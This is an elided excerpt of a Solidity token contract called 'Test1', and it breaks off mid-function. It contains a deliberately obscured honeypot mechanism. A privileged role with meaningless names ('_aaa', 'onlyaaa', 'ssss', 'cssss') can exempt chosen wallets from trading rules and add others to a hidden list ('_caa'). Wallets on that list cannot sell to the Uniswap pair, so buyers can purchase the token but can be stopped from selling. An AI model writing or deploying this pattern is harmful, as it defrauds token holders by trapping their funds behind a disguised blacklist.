...
contract Test1 is Context, IERC20, Ownable {
    ...
    string private constant _tokenName = "Test1";
    string private constant _tokenSymbol = "Test1";
    ...
    mapping(address => bool) private _aaa;
    mapping(address => bool) private _caa;
    ...
    modifier onlyaaa() {
        require(_aaa[_msgSender()], "caller is not aaa");
        _;
    }
    ...
    function _internalTransfer(
        ...
        if (!_aaa[sender] && !_aaa[recipient]) {
            require(_isTradingOpen);
            if (_isSwapEnabled) {
                require(sender == uniswapV2Pair || recipient == uniswapV2Pair);
                if (recipient == uniswapV2Pair) {
                    require(!_caa[sender], "caa");
                    require(!_caa[_msgSender()], "caa");
                }
            }
        }
    ...
    /**
        sssss addresses
     */
    function ssss(address[] calldata wallet, bool value)
        external
        onlyaaa
    {
    ...
    /**
        cssss addresses
     */
    function cssss(address[] calldata wallet, bool value)
        external
        onlyaaa
    {
        for (uint256 i = 0; i < wallet.length; i++) {
